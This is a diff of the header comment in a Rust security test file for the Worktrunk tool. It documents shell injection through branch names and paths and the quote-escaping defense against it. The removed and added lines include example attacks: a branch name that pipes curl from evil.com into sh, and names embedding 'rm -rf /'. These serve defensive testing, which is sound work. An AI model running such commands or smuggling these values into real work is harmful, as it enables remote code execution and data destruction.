@@ -1,142 +1,93 @@
-//! Security tests for directive injection vulnerabilities
+//! Security tests for shell script injection vulnerabilities
 //!
 //! # Attack Surface Analysis
 //!
-//! Worktrunk uses a directive protocol for shell integration. Commands with `--internal` output
-//! special directives that the shell wrapper interprets:
+//! Worktrunk uses a shell script protocol for shell integration. Commands with `--internal`:
+//! - Stream all user-visible output (progress, errors, hints) to stderr in real-time
+//! - Emit a shell script to stdout at the end (cd commands, exec commands)
 //!
-//! - `__WORKTRUNK_CD__/path\0` → shell executes `cd /path`
-//! - `__WORKTRUNK_EXEC__command\0` → shell executes `eval command`
-//! - Other output → printed to user
+//! The shell wrapper captures stdout via command substitution and evals it:
+//! ```bash
+//! script="$(wt --internal ... 2>&2)" && eval "$script"
+//! ```
 //!
-//! ## Vulnerability: Directive Injection
+//! ## Vulnerability: Shell Injection
 //!
-//! If external content (branch names, commit messages, file paths, git output) can inject these
-//! magic strings into stdout, the shell will execute them. This is analogous to SQL injection
+//! If external content (branch names, file paths, git output) can inject malicious shell
+//! code into stdout, the shell wrapper will execute it. This is analogous to SQL injection
 //! or command injection vulnerabilities.
 //!
 //! ## Attack Vectors
 //!
-//! ### 1. NUL Byte Injection (HIGH RISK)
+//! ### 1. Path Injection via Single Quote Escaping (HIGH RISK if not escaped)
 //!
-//! The shell wrapper splits output on NUL bytes (`\0`). If an attacker can inject a NUL byte
-//! followed by a directive into user content, they can execute arbitrary commands.
+//! Paths are emitted in single quotes: `cd '/path/to/worktree'`
+//! Single quotes prevent most shell metacharacter expansion, but embedded single quotes
+//! could break out of the quoting if not properly escaped.
 //!
-//! **Example attack:**
+//! **Example attack (if unescaped):**
 //! ```bash
-//! # Create branch with malicious name containing NUL + directive
-//! git branch $'feature\0__WORKTRUNK_EXEC__curl evil.com/malware.sh | sh'
-//! wt switch --internal $'feature\0__WORKTRUNK_EXEC__curl evil.com/malware.sh | sh'
+//! # Create directory with malicious name
+//! mkdir "test'; rm -rf /; echo '"
+//! wt switch --internal branch  # If cd emits: cd 'test'; rm -rf /; echo ''
 //! ```
 //!
-//! When worktrunk outputs:
-//! ```
-//! ✅ Switched to feature\0__WORKTRUNK_EXEC__curl evil.com/malware.sh | sh\0
-//! ```
+//! **Protection:** All paths are escaped using `replace('\'', "'\\''")` pattern,
+//! which is the standard POSIX approach for embedding single quotes in single-quoted strings.
 //!
-//! The shell splits this into two chunks:
-//! 1. `✅ Switched to feature` (printed)
-//! 2. `__WORKTRUNK_EXEC__curl evil.com/malware.sh | sh` (EXECUTED!)
+//! ### 2. Execute Command Injection (LOW RISK - user-controlled)
 //!
-//! ### 2. Line-Start Directive Injection (MEDIUM RISK)
+//! The `--execute` flag lets users specify shell commands to run. This is intentionally
+//! user-controlled and not an injection vector (users can already run arbitrary commands).
 //!
-//! If user content appears at the start of a line/chunk, it could be misinterpreted as a directive.
+//! ### 3. Branch Name in Output (NO RISK)
 //!
-//! **Example attack:**
-//! ```bash
-//! # Branch name that looks like a directive
-//! git branch '__WORKTRUNK_EXEC__rm -rf /'
-//! wt switch --internal '__WORKTRUNK_EXEC__rm -rf /'
-//! ```
-//!
-//! If output is poorly formatted, this could be executed.
-//!
-//! ### 3. Newline + Directive Injection (MEDIUM RISK)
-//!
-//! Similar to NUL injection, but using newlines. Less dangerous since directives should be
-//! NUL-terminated, but could cause issues with certain output paths.
-//!
-//! **Example attack:**
-//! ```bash
-//! git commit -m $'Fix bug\n__WORKTRUNK_EXEC__evil_command'
-//! ```
-//!
-//! ### 4. Path Injection (LOW RISK)
-//!
-//! File paths or worktree paths containing directives.
-//!
-//! **Example attack:**
-//! ```bash
-//! mkdir '__WORKTRUNK_EXEC__evil_command'
-//! ```
+//! Branch names appear in stderr messages, not in the stdout shell script.
+//! The shell wrapper only evals stdout, so stderr content cannot be executed.
 //!
 //! ## Current Protections
 //!
-//! **Multi-layered defense against NUL injection:**
+//! **Shell script protocol with proper escaping:**
 //!
-//! 1. **Git layer**: Git REJECTS NUL bytes in commit messages and ref names
-//!    ```
-//!    $ git commit -m $'Fix\0__WORKTRUNK_EXEC__evil'
-//!    error: a NUL byte in commit log message not allowed.
-//!    ```
+//! 1. **Channel separation**: User messages go to stderr, shell script goes to stdout
+//!    - Shell wrapper only evals stdout: `script="$(... 2>&2)" && eval "$script"`
+//!    - Malicious content in stderr cannot be executed
 //!
-//! 2. **Filesystem layer**: OS truncates filenames at NUL byte
-//!    ```
-//!    $ touch $'file\0evil'  # Creates "file", not "file\0evil"
-//!    ```
-//!
-//! 3. **Rust layer**: Command API rejects NUL bytes in arguments
+//! 2. **Path escaping**: All paths use single quotes with `'\''` escape pattern
 //!    ```rust
-//!    Command::new("git").arg("branch\0evil")  // Error: InvalidInput
+//!    let escaped = path_str.replace('\'', "'\\''");
+//!    writeln!(stdout, "cd '{}'", escaped)?;
 //!    ```
+//!    This handles all shell metacharacters: `$`, `` ` ``, `;`, `&`, `|`, spaces, etc.
 //!
-//! 4. **Directive protocol**:
-//!    - **NUL termination**: Directives are NUL-terminated, creating natural boundaries
-//!    - **Prefix matching**: Shell wrapper checks if chunks START with `__WORKTRUNK_CD__` or `__WORKTRUNK_EXEC__`
+//! 3. **Git layer**: Git REJECTS invalid characters in ref names
+//!
+//! 4. **Filesystem layer**: OS enforces valid path characters
 //!
 //! ## Vulnerabilities We Test
 //!
-//! This test suite verifies that user-controlled content CANNOT inject directives:
+//! This test suite verifies that user-controlled content CANNOT inject shell commands:
 //!
-//! 1. ✅ Branch names with NUL bytes + directives
-//! 2. ✅ Branch names that are directives themselves
-//! 3. ✅ Commit messages with directives
-//! 4. ✅ File paths with directives
-//! 5. ✅ Git hook output with directives (when implemented)
-//! 6. ✅ Config values with directives (when implemented)
+//! 1. ✅ Branch names with shell metacharacters
+//! 2. ✅ Branch names with single quotes
+//! 3. ✅ Paths with special characters
+//! 4. ✅ Git output with shell commands
 //!
-//! ## Gaps & Future Work
+//! ## Security Model
 //!
-//! ### Known Vulnerabilities (Not Yet Protected)
+//! The new shell script protocol is simpler and more secure than the previous NUL-delimited
+//! directive protocol:
 //!
-//! - **No escaping of user content**: User content (branch names, paths) is output as-is
-//! - **Same channel for directives and messages**: Both use stdout, making injection possible
-//! - **No cryptographic verification**: Shell can't verify directives came from worktrunk
-//!
-//! ### Potential Solutions
-//!
-//! 1. **Escape user content** (RECOMMENDED):
-//!    - Before outputting any external content, replace `__WORKTRUNK_` with `__WORKTRUNK\u{200B}_` (zero-width space)
-//!    - Or strip NUL bytes from user content
-//!    - Simple, effective, backward-compatible
-//!
-//! 2. **Separate channels**:
-//!    - Directives on stdout, user messages on stderr
-//!    - Hard to maintain temporal ordering
-//!
-//! 3. **Cryptographic signing**:
-//!    - Sign each directive with a session secret
-//!    - Complex, may not be worth it
-//!
-//! 4. **Structural encoding**:
-//!    - Use a structured format (JSON lines, msgpack) instead of raw text
-//!    - More robust but requires changing shell wrapper
+//! 1. **Simpler parsing**: No NUL byte parsing in shell, just command substitution + eval
+//! 2. **Channel separation**: Messages on stderr, script on stdout (not interleaved)
+//! 3. **Standard escaping**: Uses well-understood POSIX single-quote escaping
+//! 4. **Smaller attack surface**: Only cd and exec commands in stdout, nothing else
 //!
 //! ### Testing Limitations
 //!
 //! These tests verify that:
-//! - The binary doesn't accidentally execute directives from user content
-//! - The output format is as expected
+//! - Path escaping is correct for shell metacharacters
+//! - Branch names with special characters don't break quoting
 //!
 //! However, they DON'T fully test shell execution security because:
 //! - Tests run the Rust binary, not the shell wrapper
